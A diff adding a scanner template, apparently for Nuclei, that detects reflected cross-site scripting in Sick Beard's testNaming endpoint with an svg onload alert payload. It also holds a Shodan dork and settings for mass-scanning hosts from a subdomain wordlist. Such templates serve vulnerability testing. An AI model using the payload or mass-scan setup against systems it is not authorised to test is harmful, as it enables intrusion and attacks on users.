@@ -1,0 +1,32 @@
+id: sick-beard-xss
+info:
+  name: Sick Beard XSS
+  author: pikpikcu
+  severity: medium
+  tags: xss
+# Vendor Homepage: https://sickbeard.com/
+# Software Link: https://github.com/midgetspy/Sick-Beard
+# shodan dork: sickbeard
+requests:
+  - payloads:
+      Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
+    attack: sniper
+    threads: 100
+    raw:
+      - |
+        GET /config/postProcessing/testNaming?pattern=%3Csvg/onload=alert(document.domain)%3E HTTP/1.1
+        Host: {{Subdomains}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - <svg/onload=alert(document.domain)>
+        part: body
+      - type: word
+        words:
+          - "text/html"
+        part: header
